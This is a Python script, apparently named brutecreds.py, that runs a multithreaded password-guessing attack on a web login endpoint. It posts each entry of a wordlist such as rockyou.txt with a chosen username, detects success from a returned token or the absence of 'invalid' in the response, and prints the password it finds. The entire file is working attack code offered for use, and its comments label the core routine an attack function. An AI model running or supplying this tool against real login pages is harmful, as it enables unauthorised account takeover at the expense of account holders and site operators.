import sys
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

found_event = threading.Event()
found_password = None
lock = threading.Lock()


# ANALYZE RESPONSE
def is_success(response):
    """
    Smart login success detection
    Works for JSON + text APIs
    """

    try:
        data = response.json()
        if "token" in data:
            return True
    except:
        pass

    if response.status_code == 200:
        if "invalid" not in response.text.lower():
            return True

    return False

# ATTACK FUNCTION
def attempt_password(session, url, username, password):
    global found_password

    if found_event.is_set():
        return None

    try:
        response = session.post(
            url,
            data={
                "username": username,
                "password": password
            },
            timeout=5
        )

        if is_success(response):
            with lock:
                if not found_event.is_set():
                    found_password = password
                    found_event.set()
                    return password

    except requests.RequestException:
        pass

    return None



# MAIN FUNCTION
def main():
    if len(sys.argv) < 5:
        print("Usage: python brutecreds.py <url> <username> <wordlist> <threads>")
        print("Example: python brutecreds.py http://127.0.0.1:5000/login admin rockyou.txt 10")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    wordlist_path = sys.argv[3]
    max_threads = int(sys.argv[4])

    print(f"\n[*] Target   : {url}")
    print(f"[*] Username : {username}")
    print(f"[*] Threads  : {max_threads}\n")

    session = requests.Session()

    try:
        with open(wordlist_path, "r", encoding="latin-1") as f:
            passwords = [p.strip() for p in f if p.strip()]

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []

            for password in passwords:
                if found_event.is_set():
                    break

                print(f"[-] Trying: {password[:40]:<40}", end="\r")

                futures.append(
                    executor.submit(
                        attempt_password,
                        session,
                        url,
                        username,
                        password
                    )
                )

            for future in as_completed(futures):
                if found_event.is_set():
                    break

    except FileNotFoundError:
        print("[!] Wordlist not found")
        sys.exit(1)

    print("\n")

    if found_event.is_set():
        print(f"[+] Password FOUND: {found_password}")
    else:
        print("[-] No password found")


if __name__ == "__main__":
    main()